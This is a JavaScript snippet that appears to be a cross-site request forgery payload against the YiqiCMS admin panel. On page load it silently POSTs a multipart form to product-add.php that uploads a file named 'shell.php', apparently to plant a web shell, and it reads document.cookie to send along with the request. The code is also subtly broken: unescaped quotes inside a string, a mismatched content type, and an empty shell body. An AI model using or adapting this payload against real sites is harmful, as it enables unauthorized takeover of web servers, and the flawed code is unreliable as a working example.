<script>

			function ajax(){

				var request = false;

				if(window.XMLHttpRequest) {

					request = new XMLHttpRequest();

				} else if(window.ActiveXObject) {

					var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];

					for(var i=0; i<versions.length; i++) {

						try {

							request = new ActiveXObject(versions[i]);			 

						} catch(e) {}			  

					}			  

				}			  

				return request;			  

			}

			var _x = ajax();			  

			postgo();

			function postgo() {			  

				src="http://192.168.10.70/yiqicms/admin/product-add.php";

				data="------WebKitFormBoundaryB6QWa9tMYBn1hUTB\r\nContent-Disposition: form-data; name="productname"\r\n\r\nxxxxxx\r\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\r\nContent-Disposition: form-data; name="productcategory"\r\n\r\n3\r\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\r\nContent-Disposition: form-data; name="productseotitle"\r\n\r\nxxxxxx\r\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\r\nContent-Disposition: form-data; name="productkeywords"\r\n\r\n\r\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\r\nContent-Disposition: form-data; name="productdescription"\r\n\r\n\r\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\r\nContent-Disposition: form-data; name="productthumb"; filename="shell.php"\r\nContent-Type: application/php\r\n\r\n\r\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\r\nContent-Disposition: form-data; name="productadddate"\r\n\r\n2014-09-28 09:13:04\r\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\r\nContent-Disposition: form-data; name="productfilename"\r\n\r\n\r\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\r\nContent-Disposition: form-data; name="producttemplets"\r\n\r\n{style}/product.tpl\r\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\r\nContent-Disposition: form-data; name="productcontent"\r\n\r\n<p>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>\r\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\r\nContent-Disposition: form-data; name="chk[]"\r\n\r\n1\r\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\r\nContent-Disposition: form-data; name="extname[1]"\r\n\r\n\r\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\r\nContent-Disposition: form-data; name="extvalue[1]"\r\n\r\n\r\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB\r\nContent-Disposition: form-data; name="action"\r\n\r\nsave\r\n------WebKitFormBoundaryB6QWa9tMYBn1hUTB--";

				xhr_act("POST",src,data);			  

			}			  

			function xhr_act(_m,_s,_a){

				_x.open(_m,_s,false);				

				cookie = document.cookie;

				if(_m=="POST"){

					_x.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");

					_x.setRequestHeader("Cookie",cookie);

				}			  

				_x.send(_a);			  

				return _x.responseText;			 

			}